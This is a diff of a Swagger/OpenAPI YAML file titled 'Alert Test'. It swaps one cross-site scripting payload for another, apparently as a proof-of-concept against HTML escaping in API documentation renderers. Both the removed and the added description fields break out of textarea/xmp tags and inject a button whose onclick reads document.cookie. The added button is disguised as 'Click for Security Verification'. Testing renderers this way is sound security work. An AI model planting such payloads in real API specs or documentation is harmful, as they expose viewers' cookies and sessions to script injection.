@@ -2,12 +2,16 @@ swagger: '2.0'
 info:
   title: Alert Test
   version: 1.0.0
-definitions:
-  User:
-    type: object
-    properties:
-      name:
-        type: string
-        description: |
-          </textarea>
-          <button onclick="alert('XSS from schema description!\n' + document.cookie)">Click Me</button>
+paths:
+  /test:
+    get:
+      summary: Test Endpoint
+      description: |
+        </textarea></xmp>
+        <button style="padding:14px 28px; background:#c62828; color:white; font-weight:bold; border:none; border-radius:8px; cursor:pointer;"
+                onclick="alert(document.domain + '\n' + document.cookie)">
+          Click for Security Verification
+        </button>
+      responses:
+        '200':
+          description: OK
